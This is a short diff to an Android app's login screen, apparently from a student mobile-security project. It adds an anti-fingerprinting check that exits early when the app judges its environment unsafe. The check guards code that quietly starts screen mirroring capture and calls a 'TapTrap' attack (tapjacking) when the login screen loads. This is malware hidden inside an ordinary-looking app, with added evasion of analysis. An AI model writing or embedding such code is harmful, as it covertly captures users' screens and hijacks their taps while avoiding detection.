@@ -38,6 +38,7 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.unit.dp
 import androidx.navigation.NavHostController
+import com.example.inf2007_mad_j1847.test.AntiFingerprint
 import com.example.inf2007_mad_j1847.test.ScreenMirrorService
 import com.example.inf2007_mad_j1847.test.TapTrap
 import com.example.inf2007_mad_j1847.utils.StringHelper
@@ -74,6 +75,10 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
     }
 
     LaunchedEffect(Unit) {
+        if (!AntiFingerprint.isSafeToRun(context)){
+            return@LaunchedEffect
+
+        }
         if (ScreenMirrorService.sResultData == null) {
 
             val captureIntent =
@@ -93,10 +98,6 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
 
         println("launch ENTER")
         tapTrap.startAttack()
-
-        StringHelper.testObfuscation()
-
-
 
     }
 
